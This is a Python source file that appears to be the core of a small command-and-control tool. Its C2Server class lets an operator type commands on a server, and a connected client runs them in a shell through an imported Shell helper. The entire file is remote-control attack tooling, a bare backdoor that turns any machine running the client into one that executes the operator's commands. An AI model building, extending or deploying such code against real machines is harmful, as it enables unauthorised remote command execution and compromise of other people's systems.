from helper.socket import Server, Client
from helper.Shell import Shell

class C2Server():
    def __init__(self, host="0.0.0.0", port=7706):
        self.host = host
        self.port = int(port)
        self.shell_mode = False


    def start_server(self):
        print("[STARTING] server is starting...")
        self.server = Server(self.handle_client, self.host, self.port)

    def start_client(self):
        print("[STARTING] client is starting...")
        self.client = Client(self.handle_server, self.host, self.port)
   
    def handle_server(self, res, instance):
        print(f"[server][{self.host}:{self.port}]: {res}")

        if res == "shell":
            self.shell_mode = True
            instance.heder = 20480
            instance.send("shell: Started")
            return

        if self.shell_mode:
            if res == "exit":
                self.shell_mode = False
                instance.send("shell: Stopped")
                return

            shell = Shell(res)
            result = shell.run()
            print(result)
            instance.send("shell: Executed")
            return

        instance.send("Command Executed")
        


    def handle_client(self, res, instance):
        print(f"[client][{self.host}:{self.port}]: {res}")

        cmd = input(f"[server][{self.host}:{self.port}]: ").strip()
        instance.send(cmd)

        
   